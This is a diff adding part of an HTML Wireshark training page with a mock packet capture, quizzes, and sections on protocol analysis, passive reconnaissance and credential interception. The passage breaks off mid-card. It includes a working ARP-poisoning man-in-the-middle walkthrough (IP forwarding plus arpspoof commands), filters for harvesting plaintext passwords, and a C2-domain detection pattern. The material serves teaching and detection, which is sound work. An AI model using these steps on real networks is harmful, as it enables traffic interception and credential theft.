+  <p style="font-size:0.84rem;color:var(--muted);margin-bottom:0.5rem;">Click any packet row to expand its details below.</p>
+
+  <div class="ws-window">
+    <div class="ws-titlebar">
+      <div class="ws-controls"><div class="wsc wsc-r"></div><div class="wsc wsc-y"></div><div class="wsc wsc-g"></div></div>
+      <div class="ws-title">Capturing on eth0 — 847 packets</div>
+      <div style="font-family:var(--mono);font-size:0.6rem;color:var(--green);">● LIVE</div>
+    </div>
+    <div class="ws-toolbar">
+      <span class="ws-filter-label">Filter:</span>
+      <div class="ws-filter-box" id="filter-display">http || dns || ftp || arp</div>
+      <button class="ws-apply">Apply</button>
+    </div>
+    <div class="ws-packets">
+      <div class="ws-cols">
+        <div class="ws-col-h">No.</div><div class="ws-col-h">Time</div><div class="ws-col-h">Source</div>
+        <div class="ws-col-h">Destination</div><div class="ws-col-h">Proto</div><div class="ws-col-h">Len</div>
+        <div class="ws-col-h">Info</div>
+      </div>
+      <!-- packets -->
+      <div class="ws-packet dns" onclick="expandPacket(this,'dns-1')" id="pkt1">
+        <div class="ws-cell num">1</div><div class="ws-cell">0.000</div><div class="ws-cell">192.168.1.10</div>
+        <div class="ws-cell">8.8.8.8</div><div class="ws-cell proto-dns">DNS</div><div class="ws-cell">75</div>
+        <div class="ws-cell">Standard query A www.google.com</div>
+      </div>
+      <div class="ws-packet dns" onclick="expandPacket(this,'dns-2')" id="pkt2">
+        <div class="ws-cell num">2</div><div class="ws-cell">0.022</div><div class="ws-cell">8.8.8.8</div>
+        <div class="ws-cell">192.168.1.10</div><div class="ws-cell proto-dns">DNS</div><div class="ws-cell">107</div>
+        <div class="ws-cell">Standard query response A 142.250.185.78</div>
+      </div>
+      <div class="ws-packet tcp" onclick="expandPacket(this,'tcp-1')" id="pkt3">
+        <div class="ws-cell num">3</div><div class="ws-cell">0.025</div><div class="ws-cell">192.168.1.10</div>
+        <div class="ws-cell">142.250.185.78</div><div class="ws-cell proto-tcp">TCP</div><div class="ws-cell">66</div>
+        <div class="ws-cell">52341 → 80 [SYN] Seq=0 Win=64240</div>
+      </div>
+      <div class="ws-packet http" onclick="expandPacket(this,'http-1')" id="pkt4">
+        <div class="ws-cell num">4</div><div class="ws-cell">0.087</div><div class="ws-cell">192.168.1.10</div>
+        <div class="ws-cell">142.250.185.78</div><div class="ws-cell proto-http">HTTP</div><div class="ws-cell">412</div>
+        <div class="ws-cell">GET /index.html HTTP/1.1  (text/html)</div>
+      </div>
+      <div class="ws-packet arp" onclick="expandPacket(this,'arp-1')" id="pkt5">
+        <div class="ws-cell num">5</div><div class="ws-cell">1.204</div><div class="ws-cell">192.168.1.1</div>
+        <div class="ws-cell">Broadcast</div><div class="ws-cell proto-arp">ARP</div><div class="ws-cell">42</div>
+        <div class="ws-cell">Who has 192.168.1.10? Tell 192.168.1.1</div>
+      </div>
+      <div class="ws-packet alert" onclick="expandPacket(this,'ftp-1')" id="pkt6">
+        <div class="ws-cell num alert-cell">6</div><div class="ws-cell">2.341</div><div class="ws-cell">192.168.1.25</div>
+        <div class="ws-cell">192.168.1.5</div><div class="ws-cell proto-ftp">FTP</div><div class="ws-cell">89</div>
+        <div class="ws-cell alert-cell">Request: PASS s3cr3tP@ssw0rd ← PLAINTEXT CREDENTIAL!</div>
+      </div>
+      <div class="ws-packet http" onclick="expandPacket(this,'http-2')" id="pkt7">
+        <div class="ws-cell num">7</div><div class="ws-cell">3.102</div><div class="ws-cell">192.168.1.30</div>
+        <div class="ws-cell">192.168.1.100</div><div class="ws-cell proto-http">HTTP</div><div class="ws-cell">523</div>
+        <div class="ws-cell">POST /login HTTP/1.1 (application/x-www-form-urlencoded)</div>
+      </div>
+    </div>
+    <!-- Detail pane -->
+    <div class="ws-detail" id="detail-dns-1">
+      <div>▾ <span class="wd-key">Frame 1:</span> <span class="wd-val">75 bytes on wire, Interface: eth0</span></div>
+      <div>▾ <span class="wd-key">Ethernet II:</span> <span class="wd-val">Src: aa:bb:cc:dd:ee:01, Dst: aa:bb:cc:dd:ee:ff</span></div>
+      <div>▾ <span class="wd-key">Internet Protocol Version 4:</span> <span class="wd-val">Src: 192.168.1.10, Dst: 8.8.8.8</span></div>
+      <div class="wd-tree"><div><span class="wd-key">Header Length:</span> <span class="wd-val">20 bytes</span></div><div><span class="wd-key">TTL:</span> <span class="wd-val">64</span></div><div><span class="wd-key">Protocol:</span> <span class="wd-val">UDP (17)</span></div></div>
+      <div>▾ <span class="wd-key">Domain Name System (query):</span></div>
+      <div class="wd-tree"><div><span class="wd-key">Transaction ID:</span> <span class="wd-val">0x1a2b</span></div><div><span class="wd-key">Flags:</span> <span class="wd-val">0x0100 Standard query</span></div><div><span class="wd-key">Questions:</span> <span class="wd-val">1</span></div><div><span class="wd-key">Name:</span> <span class="wd-val">www.google.com</span></div><div><span class="wd-key">Type:</span> <span class="wd-val">A (Host Address)</span></div></div>
+    </div>
+    <div class="ws-detail" id="detail-dns-2">
+      <div>▾ <span class="wd-key">Domain Name System (response):</span></div>
+      <div class="wd-tree"><div><span class="wd-key">Transaction ID:</span> <span class="wd-val">0x1a2b</span> <span style="color:var(--green)">(matches query — valid response)</span></div><div><span class="wd-key">Answers:</span> <span class="wd-val">3</span></div><div><span class="wd-key">Answer 1:</span> <span class="wd-val">www.google.com → 142.250.185.78 (TTL: 300)</span></div><div><span class="wd-key">Answer 2:</span> <span class="wd-val">www.google.com → 142.250.185.100 (TTL: 300)</span></div></div>
+    </div>
+    <div class="ws-detail" id="detail-tcp-1">
+      <div>▾ <span class="wd-key">Transmission Control Protocol:</span></div>
+      <div class="wd-tree"><div><span class="wd-key">Source Port:</span> <span class="wd-val">52341</span></div><div><span class="wd-key">Destination Port:</span> <span class="wd-val">80</span></div><div><span class="wd-key">Sequence Number:</span> <span class="wd-val">0 (relative)</span></div><div><span class="wd-key">Flags:</span> <span class="wd-val">0x002 → SYN set ← This is the handshake START</span></div><div><span class="wd-key">Window Size:</span> <span class="wd-val">64240</span></div><div><span class="wd-key">Options:</span> <span class="wd-val">MSS=1460, SACK permitted, Timestamps</span></div></div>
+    </div>
+    <div class="ws-detail" id="detail-http-1">
+      <div>▾ <span class="wd-key">Hypertext Transfer Protocol:</span></div>
+      <div class="wd-tree"><div><span class="wd-key">Request Method:</span> <span class="wd-val">GET</span></div><div><span class="wd-key">Request URI:</span> <span class="wd-val">/index.html</span></div><div><span class="wd-key">Host:</span> <span class="wd-val">www.google.com</span></div><div><span class="wd-key">User-Agent:</span> <span class="wd-val">Mozilla/5.0 (X11; Linux x86_64)</span></div><div><span class="wd-key">Accept:</span> <span class="wd-val">text/html,application/xhtml+xml</span></div><div><span class="wd-key">Cookie:</span> <span class="wd-val">session=eyJhbGciOiJIUzI1NiJ9... ← session token visible!</span></div></div>
+    </div>
+    <div class="ws-detail" id="detail-arp-1">
+      <div>▾ <span class="wd-key">Address Resolution Protocol (request):</span></div>
+      <div class="wd-tree"><div><span class="wd-key">Hardware type:</span> <span class="wd-val">Ethernet (1)</span></div><div><span class="wd-key">Protocol type:</span> <span class="wd-val">IPv4 (0x0800)</span></div><div><span class="wd-key">Sender MAC:</span> <span class="wd-val">aa:bb:cc:dd:ee:01 (Router)</span></div><div><span class="wd-key">Sender IP:</span> <span class="wd-val">192.168.1.1</span></div><div><span class="wd-key">Target MAC:</span> <span class="wd-val">00:00:00:00:00:00 (unknown — this is a query)</span></div><div><span class="wd-key">Target IP:</span> <span class="wd-val">192.168.1.10</span></div></div>
+    </div>
+    <div class="ws-detail" id="detail-ftp-1">
+      <div class="wd-warn">⚠ PLAINTEXT CREDENTIAL DETECTED IN FTP TRAFFIC</div>
+      <div>▾ <span class="wd-key">File Transfer Protocol (FTP):</span></div>
+      <div class="wd-tree"><div><span class="wd-key">Request command:</span> <span class="wd-val">PASS</span></div><div class="wd-warn"><span class="wd-key">Request arg:</span> s3cr3tP@ssw0rd ← FULL PLAINTEXT PASSWORD</div><div><span class="wd-key">Direction:</span> <span class="wd-val">Client → Server</span></div><div><span class="wd-key">Port:</span> <span class="wd-val">21 (FTP control channel)</span></div></div>
+      <div style="margin-top:0.5rem;color:var(--amber);font-size:0.72rem;">Filter to find all FTP credentials: <code style="color:var(--teal)">ftp.request.command == "PASS"</code></div>
+    </div>
+    <div class="ws-detail" id="detail-http-2">
+      <div>▾ <span class="wd-key">Hypertext Transfer Protocol:</span></div>
+      <div class="wd-tree"><div><span class="wd-key">Request Method:</span> <span class="wd-val">POST</span></div><div><span class="wd-key">Request URI:</span> <span class="wd-val">/login</span></div></div>
+      <div>▾ <span class="wd-key">HTML Form URL Encoded:</span></div>
+      <div class="wd-tree"><div class="wd-warn"><span class="wd-key">username:</span> john.smith</div><div class="wd-warn"><span class="wd-key">password:</span> Welcome1234! ← PLAINTEXT IN POST BODY</div><div class="wd-warn"><span class="wd-key">remember_me:</span> true</div></div>
+      <div style="margin-top:0.5rem;color:var(--amber);font-size:0.72rem;">Filter: <code style="color:var(--teal)">http.request.method == "POST" && http contains "password"</code></div>
+    </div>
+  </div>
+
+  <div class="slbl">// §1 — QUIZ</div>
+  <div class="qb">
+    <div class="qt">You are capturing traffic on a busy corporate network and only care about web traffic. You set a display filter <code>http</code> during the capture. After 10 minutes you also want to see FTP traffic. What happens when you change the display filter to <code>http || ftp</code>?</div>
+    <div class="qopts">
+      <div class="qo" onclick="qa(this,'wrong','Display filters do not affect what was captured — only what is shown. All packets are already in memory/file. You can change display filters freely.')"><span class="qk">A</span> The FTP packets are lost — they weren't captured because the filter excluded them</div>
+      <div class="qo" onclick="qa(this,'correct','Correct! Display filters only affect what is shown in the packet list — they do not filter what is actually captured. All packets (including FTP) were captured the whole time. Changing the display filter to http || ftp immediately shows both HTTP and FTP packets from the entire capture session, including the last 10 minutes. This is why the golden rule is: capture everything with capture filters set wide (or no capture filter at all), then narrow down with display filters. If you had set a CAPTURE filter of just port 80, the FTP packets would genuinely be lost.')"><span class="qk">B</span> All FTP packets from the entire capture session appear immediately — display filters don't affect what was captured</div>
+      <div class="qo" onclick="qa(this,'wrong','Wireshark automatically captures all traffic your interface sees regardless of display filters. Display filters are a viewing mechanism only.')"><span class="qk">C</span> Wireshark starts capturing FTP from this moment onward, but past FTP is lost</div>
+      <div class="qo" onclick="qa(this,'wrong','The filter changes immediately and takes effect on all captured packets, both past and future in the current session.')"><span class="qk">D</span> You need to restart the capture for the new filter to take effect</div>
+    </div>
+    <div class="qfb" id="q0"></div>
+  </div>
+</div><!-- /p0 -->
+
+
+<!-- ══════════ §2 PROTOCOL ANALYSIS ══════════ -->
+<div class="pnl" id="p1">
+  <div class="sh">
+    <div class="sh-num blue">02</div>
+    <div class="sh-info">
+      <h2>Protocol Analysis & Interpretation</h2>
+      <p><span class="stag t-green">LAB PRACTICAL</span> TCP Handshake · HTTP · DNS · ARP · TLS Handshake · ICMP · Reading Raw Bytes</p>
+    </div>
+  </div>
+
+  <div class="note ni">
+    <div class="nico">📡</div>
+    <p><strong>Every attack leaves a protocol fingerprint.</strong> Knowing what normal TCP handshakes, DNS queries, and HTTP sessions look like means anomalies jump out immediately. This section maps each protocol to what you see in Wireshark, field by field.</p>
+  </div>
+
+  <div class="slbl">// §2.1 — TCP 3-WAY HANDSHAKE IN WIRESHARK</div>
+  <div class="ws-window">
+    <div class="ws-titlebar">
+      <div class="ws-controls"><div class="wsc wsc-r"></div><div class="wsc wsc-y"></div><div class="wsc wsc-g"></div></div>
+      <div class="ws-title">TCP Handshake — display filter: tcp && ip.addr==192.168.1.10</div>
+    </div>
+    <div class="ws-packets">
+      <div class="ws-cols"><div class="ws-col-h">No.</div><div class="ws-col-h">Source</div><div class="ws-col-h">Destination</div><div class="ws-col-h">Proto</div><div class="ws-col-h">Flags</div><div class="ws-col-h">Seq</div><div class="ws-col-h">Info</div></div>
+      <div class="ws-packet tcp selected">
+        <div class="ws-cell num">1</div><div class="ws-cell">192.168.1.10</div><div class="ws-cell">10.0.0.5</div>
+        <div class="ws-cell proto-tcp">TCP</div><div class="ws-cell" style="color:var(--amber)">SYN</div><div class="ws-cell">0</div>
+        <div class="ws-cell">→ SYN: Client initiates. "I want to connect. My seq starts at 0."</div>
+      </div>
+      <div class="ws-packet tcp">
+        <div class="ws-cell num">2</div><div class="ws-cell">10.0.0.5</div><div class="ws-cell">192.168.1.10</div>
+        <div class="ws-cell proto-tcp">TCP</div><div class="ws-cell" style="color:var(--green)">SYN-ACK</div><div class="ws-cell">0</div>
+        <div class="ws-cell">← SYN-ACK: Server responds. "OK. My seq=0. Ack=1 (your seq+1)."</div>
+      </div>
+      <div class="ws-packet tcp">
+        <div class="ws-cell num">3</div><div class="ws-cell">192.168.1.10</div><div class="ws-cell">10.0.0.5</div>
+        <div class="ws-cell proto-tcp">TCP</div><div class="ws-cell" style="color:var(--accent)">ACK</div><div class="ws-cell">1</div>
+        <div class="ws-cell">→ ACK: Client confirms. "Got it. Ack=1 (your seq+1). Connected!"</div>
+      </div>
+      <div class="ws-packet http">
+        <div class="ws-cell num">4</div><div class="ws-cell">192.168.1.10</div><div class="ws-cell">10.0.0.5</div>
+        <div class="ws-cell proto-http">HTTP</div><div class="ws-cell" style="color:var(--teal)">PSH-ACK</div><div class="ws-cell">1</div>
+        <div class="ws-cell">→ GET /page HTTP/1.1 — First data after handshake complete</div>
+      </div>
+    </div>
+  </div>
+
+  <div class="card">
+    <div class="clbl">TCP FLAGS — WHAT EACH ONE MEANS</div>
+    <table class="tbl" style="margin:0;">
+      <tr><th>FLAG</th><th>NAME</th><th>MEANING</th><th>ATTACK CONTEXT</th></tr>
+      <tr><td><span class="ham2">SYN</span></td><td>Synchronise</td><td>Initiate connection</td><td>SYN flood: millions of SYNs, no ACK → exhausts server resources</td></tr>
+      <tr><td><span class="hgn">ACK</span></td><td>Acknowledge</td><td>Confirms received data</td><td>ACK scan: used to map firewall rules (no SYN, just ACK)</td></tr>
+      <tr><td><span class="hcr">RST</span></td><td>Reset</td><td>Abort connection immediately</td><td>Port closed (RST back from target). Also used in TCP hijacking.</td></tr>
+      <tr><td><span class="htl">FIN</span></td><td>Finish</td><td>Graceful close</td><td>FIN scan: stealth port scanning (no RST logged on some systems)</td></tr>
+      <tr><td><span class="hpp">PSH</span></td><td>Push</td><td>Send data immediately</td><td>Normal data packets. PSH-ACK = data being sent right now.</td></tr>
+      <tr><td><span class="hl">URG</span></td><td>Urgent</td><td>Urgent data pointer valid</td><td>Rarely used legitimately. Often used in OS fingerprinting.</td></tr>
+    </table>
+  </div>
+
+  <div class="slbl">// §2.2 — DNS ANALYSIS</div>
+  <div class="trm">
+    <div class="tbar"><div class="d dr"></div><div class="d dy"></div><div class="d dg"></div><div class="ttl">DNS QUERIES IN WIRESHARK — WHAT TO LOOK FOR</div></div>
+    <div class="tbody"><span class="co"># Display filter for DNS only:</span>
+<span class="ha">dns</span>
+
+<span class="co"># Show only DNS queries (not responses):</span>
+<span class="ha">dns.flags.response == 0</span>
+
+<span class="co"># Find queries for a specific domain:</span>
+<span class="ha">dns.qry.name contains "google"</span>
+
+<span class="co"># SUSPICIOUS: Large DNS responses (potential DNS tunnelling):</span>
+<span class="ha">dns && frame.len > 512</span>
+
+<span class="co"># SUSPICIOUS: Many unique subdomains of same domain (DGA or tunnelling):</span>
+<span class="ha">dns.qry.name contains ".evilc2.com"</span>
+
+<span class="co"># What to read in a DNS packet:
+# Query: Transaction ID, Query Name (FQDN), Query Type (A/AAAA/MX/TXT)
+# Response: Same Transaction ID (must match!), Answer section with IP(s), TTL
+#
+# Red flags in DNS:
+# - Query type TXT with large payloads = DNS tunnelling
+# - Many NXDOMAIN responses = DGA malware trying random domains
+# - Responses from unexpected servers (not your configured DNS)
+# - Very low TTL (< 60s) = fast-flux infrastructure (botnet/C2)
+# - Queries for .onion, .bit, or encoded base64 subdomains</span></div>
+  </div>
+
+  <div class="slbl">// §2.3 — FOLLOWING TCP STREAMS</div>
+  <div class="card">
+    <div class="clbl">THE MOST USEFUL WIRESHARK FEATURE</div>
+    <p><strong>Right-click any TCP packet → Follow → TCP Stream.</strong> Wireshark reassembles the full conversation between two hosts and shows it as readable text. Red = client sent, blue = server responded. This is how you read HTTP conversations, FTP sessions, and plaintext credentials in one view instead of packet by packet.</p>
+  </div>
+  <div class="trm">
+    <div class="tbar"><div class="d dr"></div><div class="d dy"></div><div class="d dg"></div><div class="ttl">FOLLOW TCP STREAM — FTP SESSION EXAMPLE</div></div>
+    <div class="tbody"><span class="co"># Red = client, Blue = server</span>
+<span class="hc">220 FTP Server Ready</span>
+<span class="ha">USER john.smith</span>
+<span class="hc">331 Password required for john.smith</span>
+<span class="ha">PASS MyP@ssw0rd123</span>            <span class="co">← full plaintext password</span>
+<span class="hc">230 User john.smith logged in</span>
+<span class="ha">LIST</span>
+<span class="hc">150 Opening data connection
+-rw-r--r-- 1 john 4096 payroll_2024.xlsx
+-rw-r--r-- 1 john 8192 passwords.txt    </span><span class="co">← interesting filenames</span>
+<span class="hc">226 Transfer complete</span>
+<span class="ha">RETR passwords.txt</span>               <span class="co">← downloading the file!</span>
+<span class="hc">150 Opening data connection</span>
+<span class="co"># The file content appears in the data channel (ftp-data)</span>
+<span class="co"># Follow the ftp-data TCP stream to see the actual file content</span>
+
+<span class="co"># Filter to find all files downloaded via FTP:</span>
+<span class="ha">ftp.request.command == "RETR"</span></div>
+  </div>
+
+  <div class="slbl">// §2.4 — TLS HANDSHAKE READING</div>
+  <div class="card">
+    <div class="clbl">WHAT YOU CAN SEE IN ENCRYPTED TRAFFIC</div>
+    <p>Even encrypted TLS traffic reveals useful information before encryption begins. The TLS <span class="hl">ClientHello</span> exposes: the target hostname (SNI — Server Name Indication), the TLS version, and the cipher suites the client supports. The <span class="hl">ServerHello</span> reveals the chosen cipher suite and the server's certificate (including the domain, issuer, and validity period). The <span class="hcr">actual payload is encrypted</span> but the metadata is gold for reconnaissance.</p>
+  </div>
+  <div class="trm">
+    <div class="tbar"><div class="d dr"></div><div class="d dy"></div><div class="d dg"></div><div class="ttl">TLS FILTERS</div></div>
+    <div class="tbody"><span class="co"># Show all TLS handshake traffic:</span>
+<span class="ha">tls.handshake</span>
+
+<span class="co"># Find ClientHello — see what domains clients are connecting to:</span>
+<span class="ha">tls.handshake.type == 1</span>
+
+<span class="co"># Read the SNI (Server Name Indication) — hostname being accessed:</span>
+<span class="ha">tls.handshake.extensions_server_name</span>
+
+<span class="co"># Find old/weak TLS versions (security risk):</span>
+<span class="ha">tls.handshake.version < 0x0303</span>   <span class="co"># Older than TLS 1.2</span>
+
+<span class="co"># Decrypt TLS if you have the pre-master secret log:
+# Edit → Preferences → Protocols → TLS → (Pre)-Master Secret log file
+# Set SSLKEYLOGFILE=/path/to/keylog.txt in browser environment
+# export SSLKEYLOGFILE=~/ssl-keys.log && firefox &
+# Then Wireshark can decrypt and show plaintext HTTPS content</span></div>
+  </div>
+
+  <div class="slbl">// §2 — QUIZ</div>
+  <div class="qb">
+    <div class="qt">You capture traffic and see a TCP connection where the client sends a SYN, the server responds with SYN-ACK, but then immediately sends a RST-ACK before the client's final ACK arrives. What does this indicate?</div>
+    <div class="qopts">
+      <div class="qo" onclick="qa(this,'wrong','A normal handshake completes SYN → SYN-ACK → ACK. A RST from the server before the handshake completes is not normal — it indicates rejection, not a completed connection.')"><span class="qk">A</span> Normal TCP connection — RST-ACK is part of the handshake on some systems</div>
+      <div class="qo" onclick="qa(this,'correct','Correct! A RST after SYN-ACK but before the final ACK typically indicates the port is actively open but something immediately rejected the connection. Common causes: (1) A firewall or security device is intercepting the SYN-ACK and sending a RST to abort the connection (TCP RST injection — used by censorship systems and some IDS/IPS devices). (2) The server accepted the SYN at the network level but a host-based firewall or application immediately rejected it. (3) A connection tracking issue. This pattern is also how TCP RST attacks work — an attacker injects forged RST packets to terminate legitimate connections. Wireshark filter: tcp.flags.reset == 1 — look for RSTs arriving mid-connection.')"><span class="qk">B</span> The port is technically open but something (firewall/IPS) is injecting a TCP RST to abort the connection — this is TCP RST injection</div>
+      <div class="qo" onclick="qa(this,'wrong','Retransmission generates duplicate SYN packets when no SYN-ACK is received. A RST from the server is an active rejection, not a retransmission indicator.')"><span class="qk">C</span> Network retransmission — the packet was duplicated in transit</div>
+      <div class="qo" onclick="qa(this,'wrong','Half-open connections (SYN flood) involve the server never receiving the final ACK. Here the server is actively sending a RST, which is an explicit connection refusal or injection.')"><span class="qk">D</span> SYN flood attack — the server is overwhelmed and dropping connections</div>
+    </div>
+    <div class="qfb" id="q1"></div>
+  </div>
+</div><!-- /p1 -->
+
+
+<!-- ══════════ §3 PASSIVE RECON ══════════ -->
+<div class="pnl" id="p2">
+  <div class="sh">
+    <div class="sh-num red">03</div>
+    <div class="sh-info">
+      <h2>Passive Reconnaissance with Wireshark</h2>
+      <p><span class="stag t-red">OFFENSIVE</span> Host Discovery · OS Fingerprinting · Service Mapping · ARP Poisoning</p>
+    </div>
+  </div>
+
+  <div class="note nd">
+    <div class="nico">🎯</div>
+    <p><strong>Wireshark lets you map an entire network without sending a single packet yourself.</strong> Just by listening to ambient broadcast traffic — ARP, mDNS, DHCP, NetBIOS — you can identify every host, its OS, running services, and usernames, completely passively. This is stealth reconnaissance that leaves zero logs on target systems.</p>
+  </div>
+
+  <div class="slbl">// §3.1 — HOST DISCOVERY FROM AMBIENT TRAFFIC</div>
+  <div class="trm">
+    <div class="tbar"><div class="d dr"></div><div class="d dy"></div><div class="d dg"></div><div class="ttl">PASSIVE HOST DISCOVERY — NO PACKETS SENT</div></div>
+    <div class="tbody"><span class="co"># ── ARP: Every host broadcasts when looking for others ────────</span>
+<span class="ha">arp</span>  <span class="co"># Every ARP request reveals: sender IP + MAC</span>
+<span class="co"># Statistics > Endpoints > Ethernet tab shows all MACs seen
+# OUI prefix of MAC = manufacturer = device type
+# aa:bb:cc = Apple, 00:50:56 = VMware, dc:a6:32 = Raspberry Pi</span>
+
+<span class="co"># ── DHCP: Reveals hostnames and OS fingerprints ───────────────</span>
+<span class="ha">dhcp</span>
+<span class="co"># DHCP Request contains:
+# Option 12 = Hostname → "JOHNS-LAPTOP", "CORP-DC01"
+# Option 55 = Parameter Request List → OS fingerprint
+#   Windows: requests options 1,15,3,6,44,46,47,31,33,249,43
+#   Linux:   requests options 1,28,2,3,15,6,12
+#   Mac:     requests options 1,121,3,6,15,119,252,95,44,46</span>
+
+<span class="co"># ── mDNS/Bonjour: Apple/Linux service announcements ──────────</span>
+<span class="ha">mdns</span>
+<span class="co"># Reveals: hostnames, services (AirPlay, printing), device types</span>
+
+<span class="co"># ── NetBIOS: Windows hostnames and workgroup names ────────────</span>
+<span class="ha">nbns</span>
+<span class="co"># Every Windows machine broadcasts its name periodically
+# Filter: nbns.name to see all Windows hostnames
+# This maps your entire Windows network passively</span>
+
+<span class="co"># ── BROWSER: SMB browser elections (older Windows) ───────────</span>
+<span class="ha">browser</span>
+<span class="co"># Reveals domain names, workgroup structure, Windows versions</span>
+
+<span class="co"># ── tshark: Automated passive host discovery ─────────────────</span>
+<span class="pr">$</span> <span class="cm">tshark -i eth0 -T fields -e ip.src -e eth.src -e _ws.col.Info \
+  -Y "arp || dhcp || mdns || nbns" 2>/dev/null | sort -u</span>
+<span class="hl2">192.168.1.1    aa:bb:cc:11:22:33    ARP Who has 192.168.1.10?
+192.168.1.10   dd:ee:ff:44:55:66    DHCP Request - JOHNS-LAPTOP
+192.168.1.20   11:22:33:77:88:99    NBNS Name query CORP-DC01
+192.168.1.50   dc:a6:32:ab:cd:ef    mDNS raspberrypi.local</span></div>
+  </div>
+
+  <div class="slbl">// §3.2 — OS FINGERPRINTING FROM TCP</div>
+  <div class="card">
+    <div class="clbl">TCP STACK FINGERPRINTING — IDENTIFY OS WITHOUT SCANNING</div>
+    <p>Every OS implements the TCP stack slightly differently. The <span class="hl">TCP Window Size</span> in SYN packets, the <span class="hl">TTL value</span> in IP headers, and the <span class="hl">TCP Options</span> combination create a unique fingerprint for each OS. You can identify Windows vs Linux vs Mac vs iOS just from passive traffic.</p>
+    <table class="tbl" style="margin-top:0.8rem;">
+      <tr><th>OS</th><th>INITIAL TTL</th><th>TCP WINDOW SIZE</th><th>TCP OPTIONS</th></tr>
+      <tr><td><span class="hl">Windows 10/11</span></td><td>128</td><td>64240 or 65535</td><td>MSS, NOP, WS=8, NOP, NOP, SACK</td></tr>
+      <tr><td><span class="hgn">Linux (recent)</span></td><td>64</td><td>29200 or 43690</td><td>MSS, SACK, Timestamps, NOP, WS=7</td></tr>
+      <tr><td><span class="ham2">macOS</span></td><td>64</td><td>65535</td><td>MSS, NOP, WS=6, NOP, NOP, Timestamps, SACK</td></tr>
+      <tr><td><span class="hpp">iOS / Android</span></td><td>64</td><td>65535</td><td>MSS, NOP, WS=6, SACK, Timestamps</td></tr>
+      <tr><td><span class="hcr">Network device</span></td><td>255</td><td>Varies</td><td>Minimal options</td></tr>
+    </table>
+  </div>
+
+  <div class="slbl">// §3.3 — ARP POISONING (TRAFFIC REDIRECTION)</div>
+  <div class="attack-flow">
+    <div class="af-step"><div class="af-n red">1</div><div class="af-label">Listen First</div><div class="af-desc">Capture ARP traffic to learn the network. Identify: the gateway IP/MAC, target host IP/MAC. Display filter: <code>arp</code>. Use Statistics > Endpoints to build a host list.<div class="af-cmd">arp</div></div></div>
+    <div class="af-step"><div class="af-n red">2</div><div class="af-label">Enable Forwarding</div><div class="af-desc">Enable IP forwarding so traffic you intercept still reaches its destination. Without this, you create a DoS instead of a silent MITM.<div class="af-cmd">echo 1 > /proc/sys/net/ipv4/ip_forward</div></div></div>
+    <div class="af-step"><div class="af-n red">3</div><div class="af-label">Poison ARP Cache</div><div class="af-desc">Send fake ARP replies to both the target and gateway, telling each that the other's IP maps to your MAC address. Both will send their traffic to you.<div class="af-cmd">arpspoof -i eth0 -t 192.168.1.10 192.168.1.1 &amp;&amp; arpspoof -i eth0 -t 192.168.1.1 192.168.1.10</div></div></div>
+    <div class="af-step"><div class="af-n red">4</div><div class="af-label">Capture in Wireshark</div><div class="af-desc">All traffic between the target and gateway now flows through your machine. Open Wireshark — you see everything. Apply filters for credentials, sessions, and file transfers.<div class="af-cmd">http || ftp || smtp || pop3 || telnet</div></div></div>
+    <div class="af-step"><div class="af-n amber">5</div><div class="af-label">Detect ARP Poison</div><div class="af-desc">In Wireshark, ARP poisoning is visible: two different MACs claiming the same IP. Filter: <code>arp.duplicate-address-detected</code> — Wireshark flags this automatically with "[Duplicate IP address detected]" warnings.<div class="af-cmd">arp.duplicate-address-detected</div></div></div>
+  </div>
+
+  <div class="slbl">// §3 — QUIZ</div>
+  <div class="qb">
+    <div class="qt">You're passively monitoring a network and notice a host sending ARP replies saying "192.168.1.1 is at AA:BB:CC:DD:EE:FF" even though no one asked. The real gateway has MAC 11:22:33:44:55:66. What is happening and what Wireshark filter catches it?</div>
+    <div class="qopts">
+      <div class="qo" onclick="qa(this,'wrong','Gratuitous ARP is a valid mechanism but is typically used for legitimate purposes like updating caches after IP changes or failover. Unsolicited ARP replies claiming a different MAC for the gateway IP is the signature of ARP poisoning.')"><span class="qk">A</span> Normal gratuitous ARP — harmless and expected on all networks</div>
+      <div class="qo" onclick="qa(this,'wrong','ARP probe is used to check if an IP is already in use before claiming it. It uses a sender IP of 0.0.0.0, not a legitimate IP claiming to be the gateway.')"><span class="qk">B</span> ARP probe — the host is checking if the gateway IP is available</div>
+      <div class="qo" onclick="qa(this,'correct','Correct! This is ARP cache poisoning. The attacker is sending unsolicited ARP replies falsely claiming that the gateway IP (192.168.1.1) maps to their MAC (AA:BB:CC:DD:EE:FF). Every host that receives this updates their ARP cache with the false mapping and sends traffic destined for the gateway to the attacker instead. Wireshark filter: arp.duplicate-address-detected or manually: arp.opcode == 2 (reply) — then look at ARP replies where the sender IP is the gateway but the sender MAC is unexpected. Wireshark also automatically shows "[Duplicate IP address detected]" warnings in the Info column when two different MACs claim the same IP.')"><span class="qk">C</span> ARP poisoning attack — the attacker is sending fake ARP replies to redirect gateway-bound traffic. Filter: <code>arp.duplicate-address-detected</code></div>
+      <div class="qo" onclick="qa(this,'wrong','DHCP spoofing sends fake DHCP offers, not fake ARP replies. The two attacks are different — DHCP spoofing operates at a higher level during IP assignment, not at the ARP layer.')"><span class="qk">D</span> DHCP spoofing — the attacker is impersonating the DHCP server</div>
+    </div>
+    <div class="qfb" id="q2"></div>
+  </div>
+</div><!-- /p2 -->
+
+
+<!-- ══════════ §4 CREDENTIAL INTERCEPTION ══════════ -->
+<div class="pnl" id="p3">
+  <div class="sh">
+    <div class="sh-num red">04</div>
+    <div class="sh-info">
+      <h2>Credential Interception</h2>
+      <p><span class="stag t-red">OFFENSIVE</span> FTP · HTTP Basic Auth · Telnet · SMTP · SMB · Cookie Theft · Export Objects</p>
+    </div>
+  </div>
+
+  <div class="note nd">
+    <div class="nico">🔑</div>
+    <p><strong>Plaintext protocols are an attacker's best friend.</strong> FTP, Telnet, HTTP Basic Auth, POP3, SMTP AUTH, and IMAP all transmit credentials in cleartext. A single Wireshark capture on any network segment carrying these protocols yields working usernames and passwords. This section shows every filter and technique.</p>
+  </div>
+
+  <div class="slbl">// §4.1 — CREDENTIAL HARVEST FILTERS</div>
+  <div class="filter-grid">
+    <div class="filter-card">
+      <div class="fc-filter">ftp.request.command == "PASS"</div>
+      <div class="fc-desc">FTP passwords — shows every password sent to an FTP server</div>
+      <div class="fc-example">FTP sends USER then PASS in plaintext on port 21</div>
+    </div>
+    <div class="filter-card">
+      <div class="fc-filter">ftp.request.command == "USER"</div>
+      <div class="fc-desc">FTP usernames — pair with PASS filter to get full credentials</div>
+      <div class="fc-example">Combine: ftp.request.command == "USER" || ftp.request.command == "PASS"</div>
+    </div>
+    <div class="filter-card">
